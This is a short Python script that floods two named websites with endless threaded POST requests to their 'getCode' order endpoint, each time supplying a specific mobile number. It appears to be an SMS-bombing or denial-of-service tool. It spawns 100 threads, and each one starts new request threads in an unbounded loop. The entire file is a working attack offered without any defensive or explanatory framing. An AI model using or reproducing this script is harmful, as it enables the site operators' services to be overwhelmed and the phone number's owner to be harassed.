import requests


def a():
    url = "https://kektrade.xyz/index.php?m=Order&a=getCode"
    url2 = "https://0310game.xyz/index.php?m=Order&a=getCode"
    data = {"item_id": 2,
            # "mobile": "",
            "mobile": "15632434103",
            "page": "index"}
    i = 1
    while 1:
        threading.Thread(target=requests.post, args=(url, data)).start()
        threading.Thread(target=requests.post, args=(url2, data)).start()
        # print(res.text)
        i += 1
        print(i)


if __name__ == '__main__':
    import threading

    for i in range(100):
        threading.Thread(target=a).start()
    print(111111111)
